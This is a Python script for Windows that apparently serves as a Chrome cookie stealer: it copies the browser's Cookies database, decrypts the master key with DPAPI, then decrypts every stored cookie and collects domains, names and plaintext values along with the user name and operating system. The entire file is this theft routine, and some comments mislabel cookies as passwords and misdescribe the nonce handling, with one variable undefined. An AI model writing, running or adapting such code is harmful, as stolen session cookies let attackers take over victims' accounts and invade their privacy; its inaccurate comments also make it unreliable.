import base64
import datetime
import getpass
import json
import os
import platform
import string
import shutil
import sqlite3
import BCrypt
from ctypes import windll, cdll, POINTER, Structure, c_char, byref, create_string_buffer
from ctypes.wintypes import DWORD


# Stuff that's needed for ctypes call
CryptUnprotectData = windll.crypt32.CryptUnprotectData  # Stores the call we want
CRYPTPROTECT_UI_FORBIDDEN = 0x01  # Flag used when the (UI) is not an option. Needed in order for it to work
LocalFree = windll.kernel32.LocalFree  # De-allocates ptr
memcpy = cdll.msvcrt.memcpy  # Sets up memory copy


# Same as C structure
class DataBlob(Structure):
    _fields_ = [
        ('cbData', DWORD),  # A DWORD variable that contains the count, in bytes, of data.
        ('pbData', POINTER(c_char))  # A pointer to the data buffer.
    ]


# display's the owner of the pc and current OS
def get_info():
    s = ""
    name = getpass.getuser()
    OsName = platform.system()
    s += "%s\n" % (f"System belongs to: {name}\nOperating System: {OsName}",)
    return s


# Gets the contents of the Login Data file (Username, websites, passwords)
def OpenCookieDb(file):
    shutil.copy2(file, "spectre.db")  # makes a temp DB file so chrome doesn't have to be shut down
    connection = sqlite3.connect("spectre.db", timeout=20)  # Connect to DB, Timeout fixed an issue I had
    cursor = connection.cursor()  # Points at rows and moves down, like a mouse cursor
    cursor.execute('SELECT host_key, encrypted_value, name FROM cookies')  # Gets the fields we want
    FinalData = cursor.fetchall()  # Puts all the data into a variable
    cursor.close()  # Close the SQL command
    connection.close()  # Close the SQL connection
    os.remove("spectre.db")  # Get rid of the temp DB file
    return FinalData  # Returns all the information that we stored from the login file DB


# gets the content within local state which contains the blob key
def GetEncryptedKeyData(path):
    with open(path) as local_file:  # open the file
        LocalState = local_file.read()  # reads contents
        LocalState = json.loads(LocalState)  # turns text into python obj
    LocalStateParsed = base64.b64decode(LocalState["os_crypt"]["encrypted_key"])  # parse the filed with the key
    LocalStateParsed = LocalStateParsed[5:]  # removes DPAPI infront of key
    return LocalStateParsed


# decrypts Chrome pw below version 80
def decrypt32(EncryptedKey):
    s = ""
    BufferIn = create_string_buffer(EncryptedKey, len(EncryptedKey))  # Creates char array
    BlobIn = DataBlob(len(EncryptedKey), BufferIn)  # stores info into struct
    BlobOut = DataBlob()
    # Returns true when the same "person" has the same logon creds and the "person" that encrypted it
    try:
        # uses windows dll to make the call.
        if CryptUnprotectData(byref(BlobIn), None, None, None, None, CRYPTPROTECT_UI_FORBIDDEN, byref(BlobOut)):
            cbData = int(BlobOut.cbData)
            pbData = BlobOut.pbData
            buffer = create_string_buffer(cbData)
            memcpy(buffer, pbData, cbData)  # Copies
            LocalFree(pbData)  # De-allocate the pointer
            return buffer.raw  # returns the pw
        else:
            pass
    except Exception as Jenova:
        s += "%s\n" % (f"Exception: {Jenova}",)


# calls BCryptDecrypt dll to get the passwords above chrome V80
def decrypt_above_80(ciphertext, key):
    nonce = ciphertext[3:15]  # strips the version off the pw and stores 16 bytes from the pw being passed in
    cipher = ciphertext[15:]  # puts only the first 16 bytes which is where the password is stored
    DecryptedPass = BCrypt.BCryptDecrypt(key, nonce, cipher)  # Call BCrypt were it decrypts the pw using BCrypt dll
    return DecryptedPass[:-16]  # Strips the last 16 bytes off since its junk


# main
def main():
    s = ""
    begin = datetime.datetime.now()  # used to calculate runtime
    # Default path
    DefaultLocal = r'{0}\AppData\Local\Google\Chrome\User Data\Local State'.format(os.path.expanduser('~'))
    DefaultCookie = r'{0}\AppData\Local\Google\Chrome\User Data\Default\Cookies'.format(os.path.expanduser('~'))
    EncryptedKey = GetEncryptedKeyData(DefaultLocal)  # Gets the key
    DecryptedKey = decrypt32(EncryptedKey)  # Spits out the decrypted key we need
    DbResults = OpenCookieDb(DefaultCookie)  # Function call to open the DB
    # Results here so the logic statements aren't more of a mess
    for results in DbResults:  # Reads thru database file
        above_v80 = decrypt_above_80(results[1], DecryptedKey)  # Pass in the password field, and the blob key
        s += "%s\n" % (f"Domain:\t{results[0]}",)
        s += "%s\n" % (f"Name:\t{results[2]}",)
        s += "%s\n\n" % (f"Value:\t{above_v80.decode('utf8')}",)
    s += "%s\n" % get_info()
    s += "%s\n" % (datetime.datetime.now(),)
    s += "%s\n" % (datetime.datetime.now() - begin,)
    return s


if __name__ == "__main__":
    main()
